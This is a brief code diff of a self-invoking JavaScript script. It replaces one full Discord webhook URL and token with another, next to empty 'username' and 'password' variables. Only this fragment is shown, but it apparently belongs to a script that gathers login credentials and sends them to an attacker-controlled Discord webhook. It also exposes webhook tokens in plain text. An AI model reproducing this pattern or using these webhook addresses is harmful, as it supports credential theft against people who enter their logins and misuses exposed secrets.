@@ -1,5 +1,5 @@
 (() => {
-  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1464590647976788000/hb-LppvtKxCE8kAQiiah65ve0vUaq_W9wOIB2jIE_2H4OOEp2wyEV3lMDDj3nsLIWZ8H';
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1464601261285441796/GyzuKtD3fqFle-8k5Nc5S0xtEBXpXnLdrqnuv5WMtISLWlFPwDA2sAi6C5iZF4aFxgWl';
 
   let username = null;
   let password = null;
